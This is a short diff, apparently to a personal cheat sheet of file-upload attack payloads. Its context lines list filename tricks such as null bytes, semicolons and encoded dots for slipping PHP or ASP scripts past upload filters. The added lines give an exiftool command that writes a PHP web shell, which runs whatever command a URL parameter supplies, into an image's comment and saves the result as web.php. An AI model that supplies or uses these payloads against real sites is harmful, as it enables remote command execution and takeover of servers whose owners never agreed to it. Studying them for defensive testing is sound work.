@@ -20,3 +20,8 @@ payloads
 exploit.php%00.jpg --> use null byte
 exploit.asp;.jpg
 exploit%2Ephp
+
+=====================================##########################===================================
+
+ exiftool -Comment="<?php echo system($_GET['command']); ?>" creator
+.png -o web.php
